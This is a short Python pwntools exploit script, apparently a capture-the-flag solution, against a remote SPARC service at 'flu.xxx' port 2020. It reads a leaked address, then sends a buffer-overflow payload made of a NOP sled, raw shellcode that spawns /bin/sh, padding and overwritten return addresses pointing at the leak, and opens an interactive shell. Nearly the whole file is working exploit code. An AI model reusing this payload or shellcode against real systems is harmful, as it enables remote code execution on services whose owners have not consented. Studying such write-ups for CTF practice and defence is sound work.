#!/usr/bin/python3

from pwn import *
from time import sleep

#p = process(['/usr/bin/qemu-sparc','-g','1234','./sparc-1'])

p = remote("flu.xxx", 2020)

#sleep(10)



shellcode = b"\x90\x90\xeb\x34\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc\xa2\x14\x63\x68\xe0\x3b\xbf\xf0\xc0\x23\xbf\xf8\x90\x23\xa0\x10\xc0\x23\xbf\xec\xd0\x23\xbf\xe8\x92\x23\xa0\x18\x94\x22\x80\x0a\x82\x10\x20\x3b\x91\xd0\x20\x08\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"



leak = int(p.recvline().strip(), 16)
log.warn("Leak @ 0x%x", leak)


p.sendline(p32(0x01000000)[::-1]*(0x100//4) + shellcode + b"M"*(0x2b8 - len(shellcode) - 0x100) + p32(leak)[::-1] + p32(leak+224)[::-1]) #0x40800188

p.interactive()
